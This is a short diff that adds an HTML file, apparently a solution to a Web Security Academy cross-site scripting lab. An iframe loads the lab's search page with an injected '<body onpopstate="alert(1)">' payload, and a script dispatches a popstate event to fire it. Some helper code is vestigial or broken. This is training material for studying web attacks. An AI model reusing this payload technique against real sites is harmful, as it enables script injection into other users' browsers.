@@ -1,0 +1,23 @@
+<script>
+    function a() {
+        console.log("inside onload")
+        console.log(iframe)
+
+        history.pushState({}, '', "/");
+        var popStateEvent = new PopStateEvent('popstate', { state: {} });
+        dispatchEvent(popStateEvent);
+    }
+
+    function b(iframe) {
+        iframe.contentWindow.a = a
+        iframe.contentWindow.a()
+    }
+
+    function appendContent(iframe) {
+        iframe.document += 'a'
+    }
+</script>
+<iframe id="haha"
+    src='https://0ab800360434066dc0178acf003f000a.web-security-academy.net/?SearchTerm=<body+onpopstate%3d"alert(1)">'
+    onload="b(this)">
+</iframe>
